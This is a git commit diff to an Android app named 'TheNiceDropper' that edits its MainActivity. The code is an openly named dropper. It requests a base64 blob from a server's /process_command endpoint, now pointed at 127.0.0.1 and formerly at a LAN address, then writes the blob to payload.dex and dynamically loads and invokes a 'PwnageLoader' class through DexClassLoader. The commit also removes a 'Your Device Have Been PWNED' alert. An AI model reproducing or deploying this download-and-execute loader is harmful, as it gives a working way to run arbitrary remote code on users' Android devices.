f1c93a8fe747dfb480f47c6258525bc561b29621
Dor <39267196+dor-alt@users.noreply.github.com>
2019-02-15 02:40:21 +0200

    Add files via upload

--- TheNiceDropper/app/src/main/java/com/zexteam/thenicedropper/MainActivity.java
+++ TheNiceDropper/app/src/main/java/com/zexteam/thenicedropper/MainActivity.java
@@ -2,7 +2,6 @@ package com.zexteam.thenicedropper;
 
 import android.app.AlertDialog;
 import android.content.Context;
-import android.content.Intent;
 import android.graphics.Color;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
@@ -21,12 +20,9 @@ import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 import android.view.Gravity;
 
-import java.io.BufferedOutputStream;
 import java.io.File;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
-import java.io.OutputStreamWriter;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 
@@ -42,26 +38,6 @@ public class MainActivity extends AppCompatActivity {
         Button btn = (Button) findViewById(R.id.button2);
         btn.setOnClickListener(downloadFromServer);
     }
-
-    private View.OnClickListener listenD = new View.OnClickListener() {
-        public void onClick(View v) {
-            AlertDialog.Builder alertDialog = new AlertDialog.Builder(MainActivity.this);
-            alertDialog.setTitle("ALERT!");
-            LinearLayout diagLayout = new LinearLayout(MainActivity.this);
-            diagLayout.setOrientation(LinearLayout.VERTICAL);
-            diagLayout.setBackgroundColor(Color.RED);
-            TextView text = new TextView(MainActivity.this);
-            text.setText("Your\nDevice\nHave\nBeen\nPWNED");
-            text.setPadding(10, 10, 10, 10);
-            text.setGravity(Gravity.CENTER);
-            text.setTextSize(20);
-            diagLayout.addView(text);
-            alertDialog.setView(diagLayout);
-            alertDialog.show();
-
-
-        }
-    };
 
     private View.OnClickListener downloadFromServer = new View.OnClickListener() {
         public void onClick(View v) {
@@ -80,14 +56,12 @@ public class MainActivity extends AppCompatActivity {
 private void loadDex(){
     File path = new File(getFilesDir(),"payload.dex");
 
-    //File cacheDir = getDir("outdex", Context.MODE_PRIVATE);
     DexClassLoader dx = new DexClassLoader(path.getAbsolutePath(), getCacheDir().getAbsolutePath(), null, getClassLoader());
     Class<Object> pwnage = null;
     Method setPwnage = null;
     Object pwnageObj = null;
     Class[] paramType = new Class[1];
     paramType[0] = Context.class;
-    //Class[] paramType = new Class[] { Object[].class };
     try {
         pwnage = (Class<Object>)dx.loadClass("com.zexteam.pwnage.PwnageLoader");
     } catch (ClassNotFoundException e) {
@@ -106,9 +80,6 @@ private void loadDex(){
     } catch (NoSuchMethodException e) {
         e.printStackTrace();
     }
-//    Object tt = (Object)getApplicationContext();
-//    Object[] param = new Object[] { tt };
-//    Object[] params = new Object[] { param };
     try {
         setPwnage.invoke(pwnageObj, MainActivity.this);
     } catch (IllegalAccessException e) {
@@ -117,30 +88,25 @@ private void loadDex(){
         e.printStackTrace();
     }
 
-
 }
+
+
 private void sendRequest(){
 
     final TextView mTextView = (TextView)findViewById(R.id.textView2);
-// ...
 
-// Instantiate the RequestQueue.
+	// Instantiate the RequestQueue.
     RequestQueue queue = Volley.newRequestQueue(this);
-    String url ="http://192.168.1.93/process_command";
+    String url ="http://127.0.0.1/process_command";
 
-// Request a string response from the provided URL.
     StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
             new Response.Listener<String>() {
                 @Override
                 public void onResponse(String response) {
-                    // Display the first 500 characters of the response string.
-//                    mTextView.setText("Response is: "+ response.substring(0,500));
                     byte[] data = Base64.decode(response, Base64.DEFAULT);
                     writeToFile(data, getApplicationContext());
                     mTextView.setText("Download success");
                     loadDex();
-
-
                 }
             }, new Response.ErrorListener() {
         @Override
@@ -155,6 +121,7 @@ private void sendRequest(){
 
 }
 
+
 private void writeToFile(byte[] data, Context context) {
     try {
         FileOutputStream outputStream = openFileOutput("payload.dex",Context.MODE_PRIVATE);
@@ -164,8 +131,8 @@ private void writeToFile(byte[] data, Context context) {
     }
     catch (IOException e) {
         e.printStackTrace();
-    }
-}
+		}
+	}
 
 }
 
